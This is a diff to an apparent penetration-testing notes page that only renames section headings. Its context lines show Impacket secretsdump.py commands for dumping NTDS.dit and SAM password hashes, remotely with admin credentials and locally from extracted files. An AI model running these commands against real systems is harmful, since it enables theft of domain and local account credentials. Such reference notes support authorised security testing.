@@ -83,13 +83,13 @@ For local authentication, add the `--local-auth` flag to the command.
 
 ### Dump NTDS
 
-#### Remote
+#### Remote NTDS
 
 ```plain
 secretsdump.py <domain>/<domain-or-local-admin>:<password>@<computer-or-domain-controller-ip> --ntds
 ```
 
-#### Local
+#### Local NTDS
 
 Also check [NTDS.dit Dump&Extract]({{< ref "ntds-dump" >}}).
 
@@ -104,13 +104,13 @@ secretsdump.py -system SYSTEM -ntds NTDS.dit -hashes lmhash:nthash LOCAL -output
 
 ### Dump SAM
 
-#### Remote
+#### Remote SAM
 
 ```plain
 secretsdump.py <domain>/<domain-or-local-admin>:<password>@<computer-or-domain-controller-ip> --sam
 ```
 
-#### Local
+#### Local SAM
 
 Instead of using [samdump2]({{< ref "samdump2" >}}).
 
